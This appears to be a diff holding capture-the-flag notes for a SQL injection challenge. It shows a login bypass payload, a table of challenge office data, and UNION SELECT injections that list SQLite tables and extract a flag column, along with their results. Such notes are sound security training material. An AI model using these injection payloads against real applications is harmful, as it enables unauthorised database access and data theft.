@@ -1,0 +1,29 @@
+username: admin
+password: 'OR1=1--';
+SQL query: SELECT id FROM users WHERE password = 'a' OR 1=1--;' AND username = 'admin';
+
+
+Algiers	Birger Jarlsgatan 7, 4 tr	+246 8-616 99 40
+Bamako	Friedrichstraße 68	+249 173 329 6295
+Nairobi	Ferdinandstraße 35	+254 703 039 810
+Kampala	Maybe all the tables	+256 720 7705600
+Kigali	8 Ganton Street	+250 7469 214 950
+Kinshasa	Sternstraße 5	+249 89 885 627 88
+Lagos	Karl Johans gate 23B, 4. etasje	+234 224 25 150
+Pretoria	149 Rue Saint-Honoré	+233 635 46 15 03
+
+
+
+Algiers' UNION SELECT 1, 2, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--;
+
+// tables
+3.31.1	3.31.1	hints
+3.31.1	3.31.1	more_table
+3.31.1	3.31.1	offices
+3.31.1	3.31.1	users
+
+Algiers' UNION SELECT 1, 2, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'more_table'--;
+
+
+Algiers' UNION SELECT 1, id, flag FROM more_table--;
+
